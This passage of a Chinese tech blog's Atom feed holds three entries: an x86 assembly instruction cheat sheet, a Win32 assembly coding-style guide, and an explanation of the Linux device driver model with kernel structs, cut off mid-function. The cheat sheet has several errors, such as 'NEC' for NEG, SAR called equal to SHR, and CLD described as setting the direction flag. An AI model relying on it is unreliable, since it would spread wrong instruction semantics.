    <updated>2020-12-02T01:41:10.000Z</updated>
    
    <content type="html"><![CDATA[<h1>数据传输指令</h1><h2 id="通用数据传送指令">通用数据传送指令</h2><p>MOV 传送字或字节.</p><p>MOVSX 先符号扩展,再传送.</p><p>MOVZX 先零扩展,再传送.</p><p>PUSH 把字压入堆栈.</p><p>POP 把字弹出堆栈.</p><p>PUSHA 把AX,CX,DX,BX,SP,BP,SI,DI依次压入堆栈.</p><p>POPA 把DI,SI,BP,SP,BX,DX,CX,AX依次弹出堆栈.</p><p>PUSHAD 把EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI依次压入堆栈.</p><p>POPAD 把EDI,ESI,EBP,ESP,EBX,EDX,ECX,EAX依次弹出堆栈.</p><p>BSWAP 交换32位寄存器里字节的顺序</p><p>XCHG 交换字或字节.( 至少有一个操作数为寄存器,段寄存器不可作为操作数)</p><p>CMPXCHG 比较并交换操作数.( 第二个操作数必须为累加器AL/AX/EAX )</p><p>XADD 先交换再累加.( 结果在第一个操作数里 )</p><p>XLAT 字节查表转换.</p><p><strong>BX 指向一张 256 字节的表的起点, AL 为表的索引值 (0-255,即0-FFH); 返回 AL 为查表结果. ( [BX+AL]-&gt;AL )</strong></p><h2 id="输入输出端口传送指令">输入输出端口传送指令</h2><p>IN I/O端口输入. ( 语法: IN 累加器, {端口号│DX} )</p><p>OUT I/O端口输出. ( 语法: OUT {端口号│DX},累加器 )</p><p><strong>输入输出端口由立即方式指定时, 其范围是 0-255; 由寄存器 DX 指定时,其范围是 0-65535.</strong></p><h2 id="目的地址传送指令">目的地址传送指令.</h2><p>LEA 装入有效地址. 例: LEA DX,string ;把偏移地址存到DX.</p><p>LDS 传送目标指针,把指针内容装入DS. 例: LDS SI,string ;把段地址:偏移地址存到DS:SI.</p><p>LES 传送目标指针,把指针内容装入ES. 例: LES DI,string ;把段地址:偏移地址存到ES:DI.</p><p>LFS 传送目标指针,把指针内容装入FS. 例: LFS DI,string ;把段地址:偏移地址存到FS:DI.</p><p>LGS 传送目标指针,把指针内容装入GS. 例: LGS DI,string ;把段地址:偏移地址存到GS:DI.</p><p>LSS 传送目标指针,把指针内容装入SS. 例: LSS DI,string ;把段地址:偏移地址存到SS:DI.</p><h2 id="标志传送指令">标志传送指令.</h2><p>LAHF 标志寄存器传送,把标志装入AH.</p><p>SAHF 标志寄存器传送,把AH内容装入标志寄存器.</p><p>PUSHF 标志入栈.</p><p>POPF 标志出栈.</p><p>PUSHD 32位标志入栈.</p><p>POPD 32位标志出栈.</p><h1>算术运算指令</h1><p>ADD 加法.</p><p>ADC 带进位加法.</p><p>INC 加 1.</p><p>AAA 加法的ASCII码调整.</p><p>DAA 加法的十进制调整.</p><p>SUB 减法.</p><p>SBB 带借位减法.</p><p>DEC 减 1.</p><p>NEC 求反(以 0 减之).</p><p>CMP 比较.(两操作数作减法,仅修改标志位,不回送结果).</p><p>AAS 减法的ASCII码调整.</p><p>DAS 减法的十进制调整.</p><p>MUL 无符号乘法.</p><p>IMUL 整数乘法.</p><p><strong>以上两条,结果回送AH和AL(字节运算),或DX和AX(字运算)</strong></p><p>AAM 乘法的ASCII码调整.</p><p>DIV 无符号除法.</p><p>IDIV 整数除法.</p><p><strong>以上两条,结果回送: 商回送AL,余数回送AH, (字节运算); 或商回送AX,余数回送DX, (字运算).</strong></p><p>AAD 除法的ASCII码调整.</p><p>CBW 字节转换为字. (把AL中字节的符号扩展到AH中去)</p><p>CWD 字转换为双字. (把AX中的字的符号扩展到DX中去)</p><p>CWDE 字转换为双字. (把AX中的字符号扩展到EAX中去)</p><p>CDQ 双字扩展. (把EAX中的字的符号扩展到EDX中去)</p><h1>逻辑运算指令</h1><p>AND 与运算.</p><p>or 或运算.</p><p>XOR 异或运算.</p><p>NOT 取反.</p><p>TEST 测试.(两操作数作与运算,仅修改标志位,不回送结果).</p><p>SHL 逻辑左移.</p><p>SAL 算术左移.(=SHL)</p><p>SHR 逻辑右移.</p><p>SAR 算术右移.(=SHR)</p><p>ROL 循环左移.</p><p>ROR 循环右移.</p><p>RCL 通过进位的循环左移.</p><p>RCR 通过进位的循环右移.</p><p><strong>以上八种移位指令,其移位次数可达255次. 移位一次时, 可直接用操作码. 如 SHL AX,1.移位&gt;1次时, 则由寄存器CL给出移位次数.如 MOV CL,04</strong></p><p>SHL AX,CL</p><h1>串指令</h1><p>DS:SI 源串段寄存器 :源串变址.</p><p>ES:DI 目标串段寄存器:目标串变址.</p><p>CX 重复次数计数器.</p><p>AL/AX 扫描值.</p><p>D标志 0表示重复操作中SI和DI应自动增量; 1表示应自动减量.</p><p>Z标志 用来控制扫描或比较操作的结束.</p><p>MOVS 串传送. ( MOVSB 传送字符. MOVSW 传送字. MOVSD 传送双字. )</p><p>CMPS 串比较. ( CMPSB 比较字符. CMPSW 比较字. )</p><p>SCAS 串扫描. 把AL或AX的内容与目标串作比较,比较结果反映在标志位.</p><p>LODS 装入串.把源串中的元素(字或字节)逐一装入AL或AX中. ( LODSB 传送字符. LODSW 传送字. LODSD 传送双字. )</p><p>STOS 保存串.是LODS的逆过程.</p><p>REP 当CX/ECX&lt;&gt;0时重复.</p><p>REPE/REPZ 当ZF=1或比较结果相等,且CX/ECX&lt;&gt;0时重复.</p><p>REPNE/REPNZ 当ZF=0或比较结果不相等,且CX/ECX&lt;&gt;0时重复.</p><p>REPC 当CF=1且CX/ECX&lt;&gt;0时重复.</p><p>REPNC 当CF=0且CX/ECX&lt;&gt;0时重复.</p><h1>程序转移指令</h1><h2 id="无条件转移指令-长转移">无条件转移指令 (长转移)</h2><p>JMP 无条件转移指令</p><p>CALL 过程调用</p><p>RET/RETF过程返回.</p><h2 id="条件转移指令-短转移-128到-127的距离内">条件转移指令 (短转移,-128到+127的距离内)</h2><p><strong>当且仅当(SF XOR OF)=1时,OP1&lt;OP2</strong></p><p>JA/JNBE 不小于或不等于时转移.</p><p>JAE/JNB 大于或等于转移.</p><p>JB/JNAE 小于转移.</p><p>JBE/JNA 小于或等于转移.</p><p><strong>以上四条,测试无符号整数运算的结果(标志C和Z).</strong></p><p>JG/JNLE 大于转移.</p><p>JGE/JNL 大于或等于转移.</p><p>JL/JNGE 小于转移.</p><p>JLE/JNG 小于或等于转移.</p><p><strong>以上四条,测试带符号整数运算的结果(标志S,O和Z).</strong></p><p>JE/JZ 等于转移.</p><p>JNE/JNZ 不等于时转移.</p><p>JC 有进位时转移.</p><p>JNC 无进位时转移.</p><p>JNO 不溢出时转移.</p><p>JNP/JPO 奇偶性为奇数时转移.</p><p>JNS 符号位为 “0” 时转移.</p><p>JO 溢出转移.</p><p>JP/JPE 奇偶性为偶数时转移.</p><p>JS 符号位为 “1” 时转移.</p><h2 id="循环控制指令-短转移">循环控制指令(短转移)</h2><p>LOOP CX不为零时循环.</p><p>LOOPE/LOOPZ CX不为零且标志Z=1时循环.</p><p>LOOPNE/LOOPNZ CX不为零且标志Z=0时循环.</p><p>JCXZ CX为零时转移.</p><p>JECXZ ECX为零时转移.</p><h2 id="中断指令">中断指令</h2><p>INT 中断指令</p><p>INTO 溢出中断</p><p>IRET 中断返回</p><h2 id="处理器控制指令">处理器控制指令</h2><p>HLT 处理器暂停, 直到出现中断或复位信号才继续.</p><p>WAIT 当芯片引线TEST为高电平时使CPU进入等待状态.</p><p>ESC 转换到外处理器.</p><p>LOCK 封锁总线.</p><p>NOP 空操作.</p><p>STC 置进位标志位.</p><p>CLC 清进位标志位.</p><p>CMC 进位标志取反.</p><p>STD 置方向标志位.</p><p>CLD 清方向标志位.</p><p>STI 置中断允许位.</p><p>CLI 清中断允许位.</p><h1>伪指令</h1><p>DW 定义字(2字节).</p><p>PROC 定义过程.</p><p>ENDP 过程结束.</p><p>SEGMENT 定义段.</p><p>ASSUME 建立段寄存器寻址.</p><p>ENDS 段结束.</p><p>END 程序结束.</p><h1>处理机控制指令</h1><h2 id="标志处理指令">标志处理指令</h2><p>CLC（进位位置0指令）</p><p>CMC（进位位求反指令）</p><p>STC（进位位置为1指令）</p><p>CLD（方向标志置1指令）</p><p>STD（方向标志位置1指令）</p><p>CLI（中断标志置0指令）</p><p>STI（中断标志置1指令）</p><p>NOP（无操作）</p><p>HLT（停机）</p><p>WAIT（等待）</p><p>ESC（换码）</p><p>LOCK（封锁）</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/711069a/">http://home.meng.uno/articles/711069a/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      数据传输指令
通用数据传送指令
MOV 传送字或字节.

MOVSX 先符号扩展,再传送.

MOVZX 先零扩展,再传送.

PUSH 把字压入堆栈.

POP 把字弹出堆栈.

PUSHA 把AX,CX,DX,BX,SP,BP,SI,DI依次压入堆栈.

POPA 把DI,SI,BP,SP,BX,DX,CX,AX依次弹出堆栈.

PUSHAD 把EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI依次压入堆栈.

POPAD 把EDI,ESI,EBP,ESP,EBX,EDX,ECX,EAX依次弹出堆栈.

BSWAP 交换32位寄存器里字节的顺序

XCHG 交换字或字节.( 至
    
    </summary>
    
      <category term="Programming Language" scheme="http://home.meng.uno/categories/Programming-Language/"/>
    
    
      <category term="ASM" scheme="http://home.meng.uno/tags/ASM/"/>
    
      <category term="汇编" scheme="http://home.meng.uno/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>汇编语言代码规范</title>
    <link href="http://home.meng.uno/articles/b0b4f7ec/"/>
    <id>http://home.meng.uno/articles/b0b4f7ec/</id>
    <published>2016-07-16T09:31:04.000Z</published>
    <updated>2020-12-02T01:41:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>随着程序功能的增加和版本的提高，程序越来越复杂，源文件也越来越多，风格规范的源程序会对软件的升级、修改和维护带来极大的方便，要想开发一个成熟的软件产品，必须在编写源程序的时候就有条不紊，细致严谨。</p><p>在编程中，在程序排版、注释、命名和可读性等问题上都有一定的规范，虽然编写可读性良好的代码并不是必然的要求（世界上还有难懂代码比赛，看谁的代码最不好读懂！），但好的代码风格实际上是为自己将来维护和使用这些代码节省时间。</p><h1>变量和函数的命名</h1><h2 id="匈牙利表示法">匈牙利表示法</h2><p>匈牙利表示法主要用在变量和子程序的命名，这是现在大部分程序员都在使用的命名约定。“匈牙利表示法”这个奇怪的名字是为了纪念匈牙利籍的Microsoft程序员Charles Simonyi，他首先使用了这种命名方法。</p><p>匈牙利表示法用连在一起的几个部分来命名一个变量，格式是类型前缀加上变量说明，类型用小写字母表示，如用h表示句柄，用dw表示double word，用sz表示以0结尾的字符串等，说明则用首字母大写的几个英文单词组成，如TimeCounter，NextPoint等，可以令人一眼看出变量的含义来，在汇编语言中常用的类型前缀有：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="selector-tag">b</span>          表示byte</span><br><span class="line">w          表示word</span><br><span class="line">dw         表示dword</span><br><span class="line">h          表示句柄</span><br><span class="line">lp         表示指针</span><br><span class="line">sz         表示以<span class="number">0</span>结尾的字符串</span><br><span class="line">lpsz       表示指向<span class="number">0</span>结尾的字符串的指针</span><br><span class="line">f          表示浮点数</span><br><span class="line">st         表示一个数据结构</span><br></pre>      </td>    </tr>  </table></figure><p>这样一来，变量的意思就很好理解：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line">hWinMain          主窗口的句柄</span><br><span class="line">dwTimeCount       时间计数器，以双字定义</span><br><span class="line">szWelcome     欢迎信息字符串，以<span class="number">0</span>结尾</span><br><span class="line">lpBuffer          指向缓冲区的指针</span><br><span class="line">stWndClass    WNDCLASS结构</span><br></pre>      </td>    </tr>  </table></figure><p>由于匈牙利表示法既描述了变量的类型，又描述了变量的作用，所以能帮助程序员及早发现变量的使用错误，如把一个数值当指针来使用引发的内存页错误等。</p><p>对于函数名，由于不会返回多种类型的数值，所以命名时一般不再用类型开头，但名称还是用表示用途的单词组成，每个单词的首字母大写。Windows API是这种命名方式的绝好例子，当人们看到ShowWindow，GetWindowText，DeleteFile和GetCommandLine之类的API函数名称时，恐怕不用查手册，就能知道它们是做什么用的。比起int 21h/09h和int 13h/02h之类的中断调用，好处是不必多讲的。</p><h2 id="对匈牙利表示法的补充">对匈牙利表示法的补充</h2><p>使用匈牙利表示法已经基本上解决了命名的可读性问题，但相对于其他高级语言，汇编语言有语法上的特殊性，考虑下面这些汇编语言特有的问题：</p><ul>  <li>对局部变量的地址引用要用lea指令或用addr伪操作，全局变量要用offset；对局部变量的使用要特别注意初始化问题。如何在定义中区分全局变量、局部变量和参数？</li>  <li>汇编的源代码占用的行数比较多，代码行数很容易膨胀，程序规模大了如何分清一个函数是系统的API还是本程序内部的子程序？</li></ul><p>实际上上面的这些问题都可以归纳为区分作用域的问题。为了分清变量的作用域，命名中对全局变量、局部变量和参数应该有所区别，所以我们需要对匈牙利表示法做一些补充，以适应Win32汇编的特殊情况，下面的补充方法是笔者提出的，读者可以参考使用：</p><ul>  <li>全局变量的定义使用标准的匈牙利表示法，在参数的前面加下划线，在局部变量的前面加@符号，这样引用的时候就能随时注意到变量的作用域。</li>  <li>在内部子程序的名称前面加下划线，以便和系统API区别。</li></ul><p>如下面是一个求复数模的子程序，子程序名前面加下划线表示这是本程序内部模块，两个参数——复数的实部和虚部用_dwX和_dwY表示，中间用到的局部变量@dwResult则用@号开头：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre>      </td>      <td class="code">        <pre><span class="line">_Calc     proc    _dwX,_dwY</span><br><span class="line">          local   @dwResult</span><br><span class="line">finit</span><br><span class="line">fild    _dwX</span><br><span class="line">          fld     st(<span class="number">0</span>)</span><br><span class="line">          fmul    ;i * i</span><br><span class="line">          fild    _dwY</span><br><span class="line">          fld     st(<span class="number">0</span>)</span><br><span class="line">          fmul    ;j * j</span><br><span class="line">          fadd    ;i * i + j * j</span><br><span class="line">          fsqrt   ;sqrt(i * i + j * j)</span><br><span class="line">          fistp   @dwResult ;put result</span><br><span class="line">          mov     eax,@dwResult</span><br><span class="line">          ret</span><br><span class="line">_Calc                endp</span><br></pre>      </td>    </tr>  </table></figure><h1>代码的书写格式</h1><h2 id="排版方式">排版方式</h2><p>程序的排版风格应该遵循以下规则。</p><p>首先是大小写的问题，汇编程序中对于指令和寄存器的书写是不分大小写的，但小写代码比大写代码便于阅读，所以程序中的指令和寄存器等要采用小写字母，而用equ伪操作符定义的常量则使用大写，变量和标号使用匈牙利表示法，大小写混合。</p><p>其次是使用Tab的问题。汇编源程序中Tab的宽度一般设置为8个字符。在语法上，指令和操作数之间至少有一个空格就可以了，但指令的助记符长度是不等长的，用Tab隔开指令和操作数可以使格式对齐，便于阅读。如：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">xor eax,eax</span><br><span class="line">fistp dwNumber</span><br><span class="line">xchg eax,ebx</span><br></pre>      </td>    </tr>  </table></figure><p>上述代码的写法就不如下面的写法整齐：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">xor        eax, eax </span><br><span class="line">fistp      dwNumber</span><br><span class="line">xchg       eax, ebx</span><br></pre>      </td>    </tr>  </table></figure><p>还有就是缩进格式的问题。程序中的各部分采用不同的缩进，一般变量和标号的定义不缩进，指令用两个Tab缩进，遇到分支或循环伪指令再缩进一格，如：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre>      </td>      <td class="code">        <pre><span class="line">.data</span><br><span class="line"></span><br><span class="line">dwFlag    dd  ?</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line"></span><br><span class="line">start:   </span><br><span class="line">     mov    eax,dwFlag</span><br><span class="line">     <span class="selector-class">.if</span>    dwFlag == <span class="number">1</span></span><br><span class="line">     call       _Function1</span><br><span class="line">     .<span class="keyword">else</span></span><br><span class="line">          call       _Function2</span><br><span class="line">     .endif</span><br></pre>      </td>    </tr>  </table></figure><p>合适的缩进格式可以明显地表现出程序的流程结构，也很容易发现嵌套错误，当缩进过多的时候，可以意识到嵌套过深，该改进程序结构了。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/b0b4f7ec/">http://home.meng.uno/articles/b0b4f7ec/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      随着程序功能的增加和版本的提高，程序越来越复杂，源文件也越来越多，风格规范的源程序会对软件的升级、修改和维护带来极大的方便，要想开发一个成熟的软件产品，必须在编写源程序的时候就有条不紊，细致严谨。

在编程中，在程序排版、注释、命名和可读性等问题上都有一定的规范，虽然编写可读性良好的代码并不是必然的要求（世界上还有难懂代码比赛，看谁的代码最不好读懂！），但好的代码风格实际上是为自己将来维护和使用这些代码节省时间。

变量和函数的命名
匈牙利表示法
匈牙利表示法主要用在变量和子程序的命名，这是现在大部分程序员都在使用的命名约定。“匈牙利表示法”这个奇怪的名字是为了纪念匈牙利籍的Microsoft
    
    </summary>
    
      <category term="Programming Language" scheme="http://home.meng.uno/categories/Programming-Language/"/>
    
    
      <category term="代码规范" scheme="http://home.meng.uno/tags/%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83/"/>
    
      <category term="ASM" scheme="http://home.meng.uno/tags/ASM/"/>
    
      <category term="汇编语言" scheme="http://home.meng.uno/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>I/O体系结构</title>
    <link href="http://home.meng.uno/articles/d0c0e94a/"/>
    <id>http://home.meng.uno/articles/d0c0e94a/</id>
    <published>2016-07-15T04:28:52.000Z</published>
    <updated>2020-12-02T01:49:25.000Z</updated>
    
    <content type="html"><![CDATA[<h1>I/O体系结构</h1><p>虚拟文件系统利用底层函数，调用每个设备的操作，那么这些操作是如何在设备上执行的，操作系统又是如何知道设备的操作是什么的呢？这些是由操作系统决定的。<br> 我们知道，操作系统的工作，是依赖于数据通路的，它们让信息得以在CPU、RAM、I/O设备之间传递。这些数据通路称为  <strong>总线</strong>。这就包括数据总线（PCI、ISA、EISA、SCSI等）、地址总线、控制总线。I/O总线，指的就是用于CPU和I/O设备之间通信的<strong>数据总线</strong>。I/O体系的通用结构如图所示：</p><p><img src="http://www.meng.uno/images/%E7%A3%81%E7%9B%98IO/IO%E7%BB%93%E6%9E%84.png" alt=""></p><p>那么CPU是如何通过I/O总线和I/O设备交互呢？这首先得从内存和外设的编址方式说起。第一种是“独立编址”，也就是内存和外设分开编址，I/O端口有独立的地址空间，这也被称为<strong>I/O映射方式</strong>。每个连接到I/O总线上的设备，都分配了自己的I/O地址集（在I/O地址空间中），它被称为I/O端口。<code>in</code>、<code>out</code>等指令用语CPU对I/O端口进行读写。在执行其中一条指令时，CPU使用地址总线选择所请求的I/O端口，使用数据总线在CPU寄存器和端口之间传送数据。这种方式编码逻辑清晰，速度快，但空间有限。</p><p>第二种是“统一编址”，也被称为<strong>内存映射方式</strong>，I/O端口还可以被映射到内存地址空间（这也正是现代硬件设备倾向于使用的方式），这样CPU就可以通过对内存操作的指令，来访问I/O设备，并且和DMA结合起来。这种方式更加统一，易于使用。它实际上使用了<code>ioremap()</code>。<strong>自从PCI总线出现后，不论采用I/O映射还是内存映射方式，都需要将I/O端口映射到内存地址空间</strong>。</p><p>每个I/O设备的I/O端口都是一组寄存器：控制寄存器、状态寄存器、输入寄存器和输出寄存器。内核会纪录分配给每个硬件设备的I/O端口。</p><h1>设备驱动程序模型</h1><p>在内核中，设备不仅仅需要完成相应的操作，还要对其电源管理、资源分配、生命周期等等行为进行统一的管理。因此，内核建立了一个统一的设备模型，提取设备操作的共同属性，进行抽象，并且为添加设备、安装驱动提供统一的接口。它们本身并不代表具体的对象，只是用来维持对象间的层次关系。</p><p>这里首先要提的是<strong>sysfs</strong>文件系统。和/proc类似，安装于/sys目录，其目的是表现出设备驱动程序模型间的层次关系。在驱动程序模型当中，有三种重要的数据结构（旧版本），自上到下分别是<code>subsystem</code>、<code>kset</code>、<code>kobject</code>。如果要理解这个模型中，每个数据结构的作用，就必须理解它们和操作系统中的什么东西相对应。它们均对应着**/sys中的目录**。<code>kobject</code>是这个对象模型中，所有对象的基类。<code>kset</code>本身首先是一个<code>kobject</code>，而它又承担着一个<code>kobject</code>容器的作用，它把<code>kobject</code>组织成有序的目录；subsys则是更高的一层抽象，它本身首先是一个<code>kset</code>。驱动、总线、设备都能够用设备驱动程序模型中的对象表示。</p><h1>设备驱动程序模型中的组件</h1><p>设备驱动程序模型建立在几个基本数据结构之上，它们描述了总线、设备、设备驱动器等等。这里，我们来看看它们的数据结构。首先，<code>device</code>用来描述设备驱动程序模型中的设备。</p><pre><code>struct device {struct device*parent;//父设备struct kobject kobj;//对应的kobjectconst char*init_name; //初始化名const struct device_type *type;//设备的类型struct mutexmutex;//驱动的互斥量struct bus_type*bus;//设备在什么类型的总线struct device_driver *driver;//设备的驱动void*driver_data;//驱动私有数据指针struct dev_pm_infopower;struct dev_pm_domain*pm_domain;//dma相关变量u64*dma_mask;u64coherent_dma_mask;unsigned longdma_pfn_offset;struct device_dma_parameters *dma_parms;struct list_headdma_pools;struct dma_coherent_mem*dma_mem; dev_tdevt;//dev目录下的描述符u32id;spinlock_tdevres_lock;struct list_headdevres_head;struct klist_nodeknode_class;struct class*class;//类void(*release)(struct device *dev);//释放设备描述符时候的回调函数};</code></pre><p>首先，可以看到<code>device</code>中包含有一个<code>kobject</code>，还包含有它相关驱动对象。所有的device对象，全部收集在devices_kset中，它对应着/sys/devices中。设备的引用计数则是由kobject来完成的。device还会被嵌入到一个更大的描述符中，例如<code>pci_dev</code>，它除了包含<code>dev</code>之外，还有PCI所特有的一些数据结构。<code>device_add</code>完成了新的device的添加工作。我注意到，<code>error = bus_add_device(dev);</code>，也就是说device的添加会把它和bus关联起来。</p><hr><p>再来看看驱动程序的结构。其数据结构为<code>device_driver</code>。相对于设备的数据结构来说，它相对较为简单：对于每个设备驱动，都有几个通用的方法，分别用语处理热插拔、即插即用、电源管理、探查设备等。同样，驱动也会被嵌入到一个更大的描述符中，例如<code>pci_driver</code>。</p><pre><code>struct device_driver {const char*name;//驱动名struct bus_type*bus;//总线描述符struct module*owner;const char*mod_name;//模块名bool suppress_bind_attrs;/* disables bind/unbind via sysfs */const struct of_device_id*of_match_table;const struct acpi_device_id*acpi_match_table;int (*probe) (struct device *dev);//探测设备int (*remove) (struct device *dev);//移除设备void (*shutdown) (struct device *dev);//断电方法int (*suspend) (struct device *dev, pm_message_t state);//低功率int (*resume) (struct device *dev);//恢复方法const struct attribute_group **groups;const struct dev_pm_ops *pm;//电源管理的操作struct driver_private *p;};</code></pre><p>为什么这里没有<code>kobject</code>呢？它实际上保存在了<code>driver_private</code>当中，这个结构和device_driver是双向链接的。</p><pre><code>struct driver_private {struct kobject kobj;struct klist klist_devices;struct klist_node knode_bus;struct module_kobject *mkobj;struct device_driver *driver;};  </code></pre><p>driver的添加，通过调用<code>driver_register()</code>来完成，它同样包含一个函数：<code>bus_add_driver()</code>，也就是将driver添加到某个bus。</p><hr><p>再来看看总线的结构。bus是连接device和driver的桥梁，bus中的很多代码，都是为了让device找到driver来设计的。总线的数据结构如下：</p><pre><code>struct bus_type {const char*name;const char*dev_name;struct device*dev_root;struct device_attribute*dev_attrs;/* use dev_groups instead */const struct attribute_group **bus_groups;const struct attribute_group **dev_groups;const struct attribute_group **drv_groups;//检查驱动是否支持特定设备int (*match)(struct device *dev, struct device_driver *drv);//回调事件，在kobject状态改变时调用int (*uevent)(struct device *dev, struct kobj_uevent_env *env);//探测设备int (*probe)(struct device *dev);//从总线移除设备int (*remove)(struct device *dev);//掉电void (*shutdown)(struct device *dev);int (*online)(struct device *dev);int (*offline)(struct device *dev);//改变电源状态和恢复int (*suspend)(struct device *dev, pm_message_t state);int (*resume)(struct device *dev);const struct dev_pm_ops *pm;const struct iommu_ops *iommu_ops;struct subsys_private *p;struct lock_class_key lock_key;};</code></pre><p>同样，总线也有一个<code>subsys_private</code>，它保存了kobject。<code>but_type</code>中定义了一系列的方法。例如，当内核检查一个给定的设备是否可以由给定的驱动程序处理时，就会执行<code>match</code>方法。可以用<code>bus_for_each_drv()</code>和<code>bus_for_each_dev()</code>函数分别循环扫描drivers和device两个链表中的所有元素，来进行match。</p><h1>设备文件</h1><p>设备驱动程序使得硬件设备，能以特定方式，响应控制设备的编程接口（一组规范的VFS函数，open，read，lseek，ioctl等），这些函数都是由驱动程序来具体实现的。在设备文件上发出的系统调用，都会由内核转化为对应的设备驱动程序函数，因此设备驱动必须被注册，也即构造一个<code>device_driver</code>，并且加入到设备驱动程序模型中。在注册时，内核会试图进行一次match。注意，这个注册的过程基本<code>driver_register</code>通常不会在驱动中直接调用，但我们但驱动通常都会间接的调用它来完成注册。</p><p>遵循linux“一切皆文件”的原则，I/O设备同样可以当作设备文件来处理，它和磁盘上的普通文件的交互方式一样，例如都可以通过<code>write()</code>系统调用写入数据。设备文件可以通过<code>mknod()</code>节点来创建，它们保存在/dev/目录下。</p><p>linux当中，硬件设备可以花费为两种：字符设备和块设备。其中，块设备指的是可以随机访问的设备，例如硬盘、软盘等；而字符设备则指的是声卡、键盘这样的设备。设备文件同样在VFS当中，但它的索引节点没有指向磁盘数据的指针，相反地它对应一个标识符（包含一个主设备号和一个次设备号）。VFS会在设备文件打开时，改变一个设备文件的缺省文件操作，让它去调用和设备相关的操作。</p><h1>字符设备驱动程序</h1><p>这里我们以字符设备驱动程序为例。首先，字符设备的驱动，在linux系统中，是以<code>cdev</code>结构来表示的：</p><pre><code>struct cdev {struct kobject kobj;struct module *owner;const struct file_operations *ops;struct list_head list;//包括的inode的devicesdev_t dev;unsigned int count;};</code></pre><p>现在让我们回顾一下inode的数据结构：</p><pre><code>struct inode {...union {struct pipe_inode_info*i_pipe;struct block_device*i_bdev;struct cdev*i_cdev;};...}</code></pre><p>我们看到了<code>cdev</code>指针的影子，可见cdev和inode确实是直接相关的。要实现驱动，首先就要对cdev进行初始化，注册字符设备。驱动的安装，首先要分配cdev结构体、申请设备号并初始化cdev。注意，驱动程序是如何和刚才我们所说的设备驱动模型建立联系的呢？实际上在初始化cdev的时候，就调用了<code>kobject_init()</code>，在模型中添加了一个<code>kobject</code>。</p><p>随后，驱动要注册cdev，也即调用<code>cdev_add()</code>函数。这个工作主要是由<code>kobj_map()</code>来实现的，它是一个数组。对于每一类设备，都有一个全局变量，例如字符设备的<code>cdev_map</code>，块设备的<code>bdev_map</code>。最后要进行硬件资源的初始化。</p><pre><code>int cdev_add(struct cdev *p, dev_t dev, unsigned count){int error;p-&gt;dev = dev;p-&gt;count = count;error = kobj_map(cdev_map, dev, count, NULL, exact_match, exact_lock, p);if (error)return error;kobject_get(p-&gt;kobj.parent);return 0;}  </code></pre><p>kobj_map的结构如下，它用来保存设备号和kobject的对应关系</p><pre><code>struct kobj_map {struct probe {struct probe *next;dev_t dev;unsigned long range;struct module *owner;kobj_probe_t *get;int (*lock)(dev_t, void *);void *data;} *probes[255];struct mutex *lock;};</code></pre><p><img src="http://www.meng.uno/images/%E7%A3%81%E7%9B%98IO/kobjmap.jpg" alt=""></p><p>不过到现在为止，我们都还没有说明，程序在访问字符设备时，是如何去调用正确的方法的。我们曾提到过，<code>open()</code>系统调用会改变字符文件对象的f_op字段，将默认文件操作替换为驱动的操作。在字符设备文件创建时，会调用<code>init_special_inode</code>来进行索引节点对象的初始化。其inode的操作(def_chr_fops)只包含一个默认的文件打开操作，也即<code>chrdev_open</code>。它会根据inode，首先利用<code>cdev_map</code>，找到对应的kobject，随后再进一步找到cdev，然后从中提取出文件操作的函数<code>fops</code>，并把它填充到file当中去。</p><pre><code>static int chrdev_open(struct inode *inode, struct file *filp){const struct file_operations *fops;struct cdev *p;struct cdev *new = NULL;int ret = 0;spin_lock(&amp;cdev_lock);p = inode-&gt;i_cdev;if (!p) {struct kobject *kobj;int idx;spin_unlock(&amp;cdev_lock);kobj = kobj_lookup(cdev_map, inode-&gt;i_rdev, &amp;idx);//获取对应的kobjectif (!kobj)return -ENXIO;new = container_of(kobj, struct cdev, kobj);spin_lock(&amp;cdev_lock);/* Check i_cdev again in case somebody beat us to it while   we dropped the lock. */p = inode-&gt;i_cdev;if (!p) {inode-&gt;i_cdev = p = new;list_add(&amp;inode-&gt;i_devices, &amp;p-&gt;list);//将device加入到cdev的list中去new = NULL;} else if (!cdev_get(p))ret = -ENXIO;} else if (!cdev_get(p))ret = -ENXIO;spin_unlock(&amp;cdev_lock);cdev_put(new);if (ret)return ret;ret = -ENXIO;fops = fops_get(p-&gt;ops)if (!fops)goto 